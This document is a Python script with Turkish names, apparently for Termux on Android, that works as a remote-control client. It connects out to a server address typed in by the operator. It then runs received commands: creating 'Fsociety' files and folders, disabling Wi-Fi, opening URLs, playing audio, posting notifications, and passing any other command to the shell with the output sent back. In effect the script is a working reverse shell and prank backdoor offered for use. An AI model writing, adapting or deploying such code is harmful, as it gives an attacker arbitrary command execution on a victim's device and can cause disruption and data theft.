
import socket
import subprocess
import os
import datetime
import random

sunucu_ip = input("Sunucu IP >> ")
port = 8080
log_file = "log.txt"
mp3_path = "/data/data/com.termux/files/home/youtube.mp3"
fsociety_path = "/sdcard/Fsociety"

# MP3 dosyasını yeniden adlandır
if os.path.exists("youtube.mp3"):
    os.rename("youtube.mp3", mp3_path)

bildirim_sayisi = 0

s = socket.socket()
s.connect((sunucu_ip, port))
print(f"[+] Bağlandı: {sunucu_ip}:{port}")

def log_yaz(komut):
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{zaman}] {komut}\n")

def dosya_olustur(adet=5):
    os.makedirs(fsociety_path, exist_ok=True)
    for i in range(1, adet + 1):
        uzanti = random.choice(['txt', 'log', 'cfg', 'db', 'bak', 'json'])
        dosya_adi = f"{fsociety_path}/dosya_{i}.{uzanti}"
        with open(dosya_adi, "w") as f:
            f.write(f"Fsociety oluşturuldu: dosya_{i}.{uzanti}\n")
    return f"[✓] {adet} adet dosya oluşturuldu."

def klasor_olustur():
    alt_klasorler = ["Logs", "Data", "Temp", "Config", "Backup"]
    for isim in alt_klasorler:
        yol = f"{fsociety_path}/{isim}"
        os.makedirs(yol, exist_ok=True)
    return "[✓] 5 klasör oluşturuldu."

while True:
    komut = s.recv(1024).decode().strip()
    log_yaz(komut)

    if komut == "exit":
        s.send(b"[X] Bağlantı kapatıldı.")
        break

    elif komut.startswith("olustur-dosya"):
        try:
            adet = int(komut.split(" ")[1]) if " " in komut else 5
            cevap = dosya_olustur(adet)
            s.send(cevap.encode())
        except:
            s.send(b"[X] Dosya oluşturulurken hata!")

    elif komut == "olustur-klasor":
        cevap = klasor_olustur()
        s.send(cevap.encode())

    elif komut.startswith("youtube "):
        url = komut.split(" ", 1)[1]
        os.system(f'termux-open {url}')
        s.send(b"[✓] YouTube açıldı")

    elif komut == "wifi-off":
        os.system("svc wifi disable")
        s.send(b"[✓] Wi-Fi kapatıldı")

    elif komut == "sound local":
        if os.path.exists(mp3_path):
            os.system(f"termux-media-player play '{mp3_path}'")
            s.send(b"[✓] Ses dosyası çalınıyor")
        else:
            s.send(b"[X] MP3 dosyası bulunamadı")

    elif komut.startswith("bildirim "):
        try:
            _, baslik, icerik = komut.split('"')[0], komut.split('"')[1], komut.split('"')[3]
            os.system(f'termux-notification --title "{baslik}" --content "{icerik}"')
            bildirim_sayisi += 1
            s.send(f"[✓] Bildirim gönderildi. Toplam: {bildirim_sayisi}".encode())
        except:
            s.send(b"[X] Bildirim gönderilemedi")

    elif komut == "bildirim-say":
        s.send(f"[ℹ️] Toplam {bildirim_sayisi} bildirim gönderildi.".encode())

    else:
        try:
            sonuc = subprocess.check_output(komut, shell=True, stderr=subprocess.STDOUT)
            s.send(sonuc)
        except Exception as e:
            s.send(str(e).encode())

s.close()
